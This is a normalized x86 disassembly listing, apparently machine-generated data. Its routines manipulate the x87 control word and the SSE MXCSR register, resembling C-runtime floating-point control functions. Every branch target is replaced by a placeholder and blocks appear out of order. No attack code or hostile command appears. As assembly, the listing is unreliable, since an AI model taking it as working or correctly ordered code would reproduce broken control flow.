and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_423898
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
xor esi esi
cmp [ ebp + 0x8 ] 0x9001f
jne r-xdata
and eax 0xfff7ffff
push eax
push [ ebp + 0x8 ]
push esi
call sub_420e3f
add esp 0xc
test eax eax
je r-xdata
cmp eax 0xffffffff
jne r-xdata
pop esi
leave
retn
push esi
push esi
push esi
push esi
push esi
call sub_40e6c1
fwait
fnstcw [ ebp - 0x4 ]
movzx ecx [ ebp - 0x4 ]
and ecx 0x1f3d
mov edx 0x23d
cmp cx dx
jne r-xdata
cmp [ rwxdata ] esi
je r-xdata
stmxcsr [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
and ecx 0xfec0
cmp ecx 0x1e80
je r-xdata
sub_42390b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
push ebx
movzx edx cx
push esi
mov ecx edx
mov esi 0xc00
and ecx esi
push edi
mov edi 0x300
mov ebx 0x200
je r-xdata
or eax 0x80000
and edx edi
je r-xdata
cmp ecx 0x400
je r-xdata
or eax 0x20000
cmp edx ebx
jne r-xdata
or eax 0x100
cmp ecx 0x800
je r-xdata
pop ebp
retn
or eax 0x40000
test [ ebp + 0x8 ] 0x1000
pop edi
pop esi
pop ebx
je r-xdata
or eax 0x10000
jmp r-xdata
or eax ebx
jmp r-xdata
cmp ecx esi
jne r-xdata
or eax edi
jmp r-xdata
sub_4239aa
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_423a38
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_423a7b
xor eax eax
test dl dl
jns r-xdata
push ebx
mov ebx 0x200
push esi
push edi
test ebx edx
je r-xdata
push 0x10
pop eax
test edx 0x400
je r-xdata
or eax 0x8
test edx 0x800
je r-xdata
or eax 0x4
test edx 0x1000
je r-xdata
or eax 0x2
mov edi 0x100
test edi edx
je r-xdata
or eax 0x1
mov ecx edx
mov esi 0x6000
and ecx esi
je r-xdata
or eax 0x80000
pop edi
and edx 0x8040
sub edx 0x40
pop esi
pop ebx
je r-xdata
cmp ecx 0x2000
je r-xdata
or eax 0x2000000
sub edx 0x7fc0
je r-xdata
or eax edi
cmp ecx 0x4000
je r-xdata
or eax 0x3000000
retn
sub edx 0x40
jne r-xdata
or eax ebx
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x1000000
retn
or eax 0x300
jmp r-xdata
sub_423b1b
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_423bbb
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
pop ebp
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_423c0a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
fwait
fnstsw [ ebp - 0x4 ]
mov al [ ebp - 0x4 ]
xor edx edx
mov esi 0x80000
test al 0x3f
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
test al 0x1
je r-xdata
mov eax edx
stmxcsr [ ebp - 0x8 ]
mov cl [ ebp - 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop edx
or eax edx
jmp r-xdata
test cl 0x1
je r-xdata
test al 0x8
je r-xdata
or edx 0x8
pop esi
leave
retn
test cl 0x4
je r-xdata
push 0x10
pop eax
test al 0x10
je r-xdata
or edx 0x4
test cl 0x8
je r-xdata
or eax 0x8
test al 0x20
je r-xdata
or edx 0x2
test cl 0x10
je r-xdata
or eax 0x4
test al 0x2
je r-xdata
or edx 0x1
test cl 0x20
je r-xdata
or eax 0x2
or edx esi
test cl 0x2
je r-xdata
or eax 0x1
or eax esi
sub_423c9c
mov edi edi
push esi
call sub_411cf8
mov esi [ eax ]
fninit
call sub_42022d
push 0x1f80
call sub_424bec
pop ecx
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
test [ eax ] 0x10008
je r-xdata
and [ eax + 0x20 ] 0x0
mov [ eax + 0x24 ] 0xffff
sub_423cd4
call sub_424bce
xor ecx ecx
test al 0x3f
je r-xdata
mov eax ecx
retn
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
or ecx 0x80000
sub_423d0f
mov edi edi
push ebp
mov ebp esp
push ecx
stmxcsr [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0xffffffc0
ldmxcsr [ ebp - 0x4 ]
mov cl [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
leave
retn
test cl 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x2
je r-xdata
or eax 0x1
or eax 0x80000
sub_423d5f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp + 0xc ] 0x308031f
stmxcsr [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
xor eax eax
test cl cl
jns r-xdata
push ebx
mov ebx 0x200
push esi
push edi
test ebx ecx
je r-xdata
push 0x10
pop eax
test ecx 0x400
je r-xdata
or eax 0x8
test ecx 0x800
je r-xdata
or eax 0x4
test ecx 0x1000
je r-xdata
or eax 0x2
mov esi 0x100
test esi ecx
je r-xdata
or eax 0x1
mov edx ecx
mov edi 0x6000
and edx edi
je r-xdata
or eax 0x80000
mov esi 0x8040
and ecx esi
sub ecx 0x40
je r-xdata
cmp edx 0x2000
je r-xdata
or eax 0x2000000
sub ecx 0x7fc0
je r-xdata
or eax esi
cmp edx 0x4000
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_423b1b
push eax
mov [ ebp - 0x4 ] eax
call sub_424bec
pop ecx
stmxcsr [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
xor eax eax
test dl dl
jns r-xdata
or eax 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or eax ebx
jmp r-xdata
cmp edx edi
jne r-xdata
test ebx edx
je r-xdata
push 0x10
pop eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not edx
and edx eax
or edx ecx
cmp edx eax
je r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
test edx 0x400
je r-xdata
or eax 0x8
test edx 0x800
je r-xdata
or eax 0x4
test edx 0x1000
je r-xdata
or eax 0x2
mov ebx 0x100
test ebx edx
je r-xdata
or eax 0x1
mov ecx edx
and ecx edi
je r-xdata
or eax 0x80000
and edx esi
sub edx 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or eax 0x2000000
sub edx 0x7fc0
je r-xdata
or eax ebx
cmp ecx 0x4000
je r-xdata
or eax 0x3000000
jmp r-xdata
sub edx 0x40
jne r-xdata
or eax 0x200
jmp r-xdata
cmp ecx edi
jne r-xdata
or eax 0x1000000
jmp r-xdata
or eax 0x300
jmp r-xdata
sub_423ed5
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
fwait
fnstsw [ ebp + 0x8 ]
mov al [ ebp + 0x8 ]
xor ecx ecx
test al 0x3f
je r-xdata
pop esi
pop ebp
retn
call sub_423cd4
mov [ esi ] eax
mov [ edx ] ecx
test al 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or ecx 0x1
or ecx 0x80000
sub_423f2f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
cmp [ rwxdata ] 0x0
je r-xdata
mov cl [ ebp - 0x4 ]
xor eax eax
test cl 0x3f
je r-xdata
mov al [ ebp - 0x4 ]
xor edx edx
push esi
mov esi 0x80000
test al 0x3f
je r-xdata
leave
retn
test cl 0x1
je r-xdata
stmxcsr [ ebp - 0x8 ]
and [ ebp - 0x8 ] 0xffffffc0
ldmxcsr [ ebp - 0x8 ]
mov cl [ ebp - 0x8 ]
xor eax eax
test cl 0x3f
je r-xdata
test al 0x1
je r-xdata
test cl 0x4
je r-xdata
push 0x10
pop eax
or eax edx
pop esi
leave
retn
test cl 0x1
je r-xdata
test al 0x4
je r-xdata
push 0x10
pop edx
test cl 0x8
je r-xdata
or eax 0x8
test cl 0x4
je r-xdata
push 0x10
pop eax
test al 0x8
je r-xdata
or edx 0x8
test cl 0x10
je r-xdata
or eax 0x4
test cl 0x8
je r-xdata
or eax 0x8
test al 0x10
je r-xdata
or edx 0x4
test cl 0x20
je r-xdata
or eax 0x2
test cl 0x10
je r-xdata
or eax 0x4
test al 0x20
je r-xdata
or edx 0x2
test cl 0x2
je r-xdata
or eax 0x1
test cl 0x20
je r-xdata
or eax 0x2
test al 0x2
je r-xdata
or edx 0x1
or eax 0x80000
test cl 0x2
je r-xdata
or eax 0x1
or edx esi
or eax esi
sub_424008
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x10
push ebx
push esi
xor edx edx
push edi
mov edi 0x300
cmp [ ebp + 0x10 ] edx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
test bl 0x1
je r-xdata
pop edi
xor eax eax
pop esi
inc eax
pop ebx
leave
retn
xor esi esi
cmp [ rwxdata ] esi
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
mov eax [ ebp + 0x14 ]
mov [ eax ] esi
and eax 0x308031f
mov [ ebp - 0x10 ] eax
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
test al al
jns r-xdata
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x1000
je r-xdata
or esi 0x2
movzx eax bx
mov ecx eax
mov esi 0xc00
and ecx esi
je r-xdata
or edx 0x80000
test eax 0x100
je r-xdata
or esi 0x1
and eax edi
je r-xdata
cmp ecx 0x400
je r-xdata
mov ecx eax
mov edi 0x6000
and ecx edi
je r-xdata
or esi 0x80000
or edx 0x20000
cmp eax 0x200
jne r-xdata
or edx 0x100
cmp ecx 0x800
je r-xdata
mov ebx 0x8040
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
not ebx
and ebx edx
or ebx eax
cmp ebx edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp ecx esi
jne r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
call sub_4239aa
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
xor ebx ebx
test dl 0x1
je r-xdata
or edx edi
jmp r-xdata
call sub_423b1b
push eax
mov [ ebp + 0x10 ] eax
call sub_424bec
pop ecx
stmxcsr [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx edi
jne r-xdata
test dl 0x4
je r-xdata
push 0x10
pop ebx
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test dl 0x8
je r-xdata
or ebx 0x8
test ecx 0x400
je r-xdata
or edx 0x8
test dl 0x10
je r-xdata
or ebx 0x4
test ecx 0x800
je r-xdata
or edx 0x4
test dl 0x20
je r-xdata
or ebx 0x2
test ecx 0x1000
je r-xdata
or edx 0x2
test dl 0x2
je r-xdata
or ebx 0x1
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
movzx ecx dx
mov eax ecx
and eax esi
je r-xdata
or ebx 0x80000
mov eax ecx
and eax edi
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
and ecx ebx
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or ebx 0x20000
cmp ecx 0x200
jne r-xdata
or ebx 0x100
cmp eax 0x800
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or ebx 0x40000
test edx 0x1000
je r-xdata
or ebx 0x10000
jmp r-xdata
or ebx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax edi
jne r-xdata
or ebx edi
jmp r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_42431f
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rwxdata ] esi
je r-xdata
mov ebx eax
call sub_4239aa
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_423b1b
push eax
mov [ ebp - 0xc ] eax
call sub_424bec
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_424631
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
and edi 0xfff7ffff
fwait
fnstcw [ ebp + 0xc ]
mov bx [ ebp + 0xc ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
je r-xdata
or edx 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov eax edi
not eax
mov ecx edi
and ecx [ ebp + 0x8 ]
and eax edx
or eax ecx
mov [ ebp - 0x10 ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rwxdata ] esi
je r-xdata
mov ebx eax
call sub_4239aa
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx 0x300
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov edi 0x6000
and ecx edi
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov ebx 0x8040
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov eax edx
mov [ ebp - 0x10 ] edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
